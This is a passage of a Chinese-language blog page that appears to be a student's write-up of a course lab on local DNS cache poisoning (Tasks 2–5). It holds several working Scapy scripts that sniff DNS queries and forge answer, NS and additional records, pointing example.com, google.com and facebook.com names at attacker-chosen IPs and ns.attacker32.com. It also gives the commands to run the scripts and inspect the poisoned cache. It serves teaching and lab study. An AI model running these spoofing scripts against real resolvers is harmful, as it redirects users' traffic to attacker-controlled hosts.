DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec )<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure>
+<p>2、清空本地DNS缓存：<code>rndc flush</code></p>
+<p>3、运行攻击代码：<code>sudo python3 ./spoof_answer.py</code>，在客户机dig域名后侦听到了数据包</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.10.png" srcset="/img/loading.gif" lazyload class="">
+<p>4、客户机执行命令：<code>dig www.example.com</code>，域名对应的IP被修改为指定的IP1.2.3.5，攻击成功。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.9.png" srcset="/img/loading.gif" lazyload class="">
+<p>5、查看缓存信息</p>
+<p>将local dns server的缓存内容写入文件，并查看。可以看到www.example.com和example.com对应的IP均被修改。攻击机停止运行攻击代码，客户机再次执行命令，仍然可以看到攻击后的结果，进一步说明了本地dns已经被成功投毒。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">rndc dumpdb -cache<br><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/cache/bind/dump.<span class="hljs-keyword">db</span> &gt; task2_cache.txt<br><span class="hljs-keyword">cat</span> task2_cache.txt<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.11.png" srcset="/img/loading.gif" lazyload class="">
+<h2 id="2-5-Task-3-Spoofifing-DNS-Records">2.5 Task 3: Spoofifing DNS Records</h2>
+<p>在前面的任务中，DNS缓存中毒攻击只影响一个主机名，task3将实现可以影响整个example.com域的攻击，其目的就是伪造权威域名服务器，<a target="_blank" rel="noopener" href="http://xn--example-oc6k070l98j.xn--netattack32-3t3sv90bo61by62apk8ach6eo5sa.com">使所有example.net域的请求都指向attack32.com</a>。如果想要得到授权对一个域进行攻击的话，就需要配置一个合法的ip。</p>
+<p>1、修改攻击代码：spoof_ns.py</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">1</span>, ns = NSsec)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure>
+<p>2、清空本地DNS缓存：<code>rndc flush</code></p>
+<p>3、运行攻击代码：<code>sudo python3 ./spoof_ns.py</code></p>
+<p>4、客户机执行命令：<code>dig www.example.com</code>，IP映射到1.2.3.5</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.12.png" srcset="/img/loading.gif" lazyload class="">
+<p>5、客户机digexample的子域名，IP映射到1.2.3.6，攻击成功：</p>
+<p><a target="_blank" rel="noopener" href="http://xn--task3-y08h91umth.example.com">子域名task3.example.com</a>：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.13.png" srcset="/img/loading.gif" lazyload class="">
+<p><a target="_blank" rel="noopener" href="http://xn--test-uk1gj6rg0g.example.com">子域名test.example.com</a>：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.14.png" srcset="/img/loading.gif" lazyload class="">
+<p>6、查看本地DNS服务的缓存内容，可以看到，映射表被成功修改：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.15.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="2-6-Task-4-Spoofifing-NS-Records-for-Another-Domain">2.6 Task 4: Spoofifing NS Records for Another Domain</h2>
+<p>1、在数据包中添加额外的信息，包含“<a target="_blank" rel="noopener" href="http://google.com">google.com</a>”，当DNS服务器接收该数据包时，就会缓存恶意的解析地址。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;google.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">1</span>, ns = NSsec2/NSsec)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53)&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure>
+<p>2、<code>dig task4.example.com</code>，结果显示，ns.attacker32.com成为了google.com的权威域名服务器。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.18.png" srcset="/img/loading.gif" lazyload class="">
+<p>其他情况：</p>
+<p>1、只有NSsec2→可以</p>
+<p>2、NSsec/NSsec2→不可以</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.17.png" srcset="/img/loading.gif" lazyload class="">
+<h2 id="2-7-Task-5-Spoofifing-Records-in-the-Additional-Section">2.7 Task 5: Spoofifing Records in the Additional Section</h2>
+<p>task5需要在附加信息字段实现攻击。和上一实验不一样的是，task4是给facebook.com域提供NS记录，<a target="_blank" rel="noopener" href="http://xn--task5facebook-m300a331bu04h.xn--comattacker32-kz4ux17p.com">而task5是把facebook.com当作attacker32.com</a> 域的一个域名服务器。虽然facebook.com不在attacker32.com的区域内，但作为域名服务器是允许的，因为一个域的权威域名服务器不一定非要在这个域内。</p>
+<p>1、修改攻击代码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>  <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>    old_ip  = pkt[IP]<br>    old_udp = pkt[UDP]<br>    old_dns = pkt[DNS]<br><br>    ip  = IP (dst = old_ip.src, src = old_ip.dst)<br>    udp = UDP(dport = old_udp.sport, sport = <span class="hljs-number">53</span>)<br><br>    Anssec = DNSRR( rrname = old_dns.qd.qname, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.5&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec  = DNSRR( rrname = <span class="hljs-string">&#x27;example.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    NSsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;google.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec1  = DNSRR( rrname = <span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec2  = DNSRR( rrname = <span class="hljs-string">&#x27;ns.example.net&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;5.6.7.8&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br>                    <br>    Addsec3  = DNSRR( rrname = <span class="hljs-string">&#x27;www.facebook.com&#x27;</span>, <br>                    <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>,<br>                    rdata  = <span class="hljs-string">&#x27;3.4.5.6&#x27;</span>,<br>                    ttl    = <span class="hljs-number">259200</span>)<br><br>    dns = DNS( <span class="hljs-built_in">id</span> = old_dns.<span class="hljs-built_in">id</span>, aa=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>,                        <br>               qdcount=<span class="hljs-number">1</span>, qd = old_dns.qd,                   <br>               ancount=<span class="hljs-number">1</span>, an = Anssec, <br>               nscount=<span class="hljs-number">2</span>, ns = NSsec2/NSsec,<br>               arcount=<span class="hljs-number">3</span>, ar = Addsec1/Addsec2/Addsec3)<br><br>    spoofpkt = ip/udp/dns<br>    send(spoofpkt)<br><br>f = <span class="hljs-string">&#x27;udp and dst port 53&#x27;</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-409df465757d&#x27;</span>, <span class="hljs-built_in">filter</span>=f, prn=spoof_dns)<br></code></pre></td></tr></table></figure>
+<p>2、清空本地DNS缓存：<code>rndc flush</code></p>
+<p>3、运行攻击代码：<code>sudo python3 ./spoof_ns.py</code></p>
+<p>4、执行命令<code>dig abc.example.com</code>：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/10.1.png" srcset="/img/loading.gif" lazyload class="">
+<p>5、查看缓存：</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Local/11.19.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>在执行 dig命令时，可以看到附加信息，但是这些附加信息并没有被缓存到本地域名服务器。</p>
+<blockquote>
+<p>:exclamation:本地DNS服务器的确发出了DNS请求，BIND域名服务器虽然缓存了这些信息， 但因为安全原因，并不信任附加部分给出的IP地址。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C/" class="category-chain-item">网络攻防课程实验</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/" title="Lab11-DNS欺骗-Remote">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Lab11-DNS欺骗-Remote</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab10_TCP%E6%94%BB%E5%87%BB/" title="Lab10-TCP攻击">
+                        <span class="hidden-mobile">Lab10-TCP攻击</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
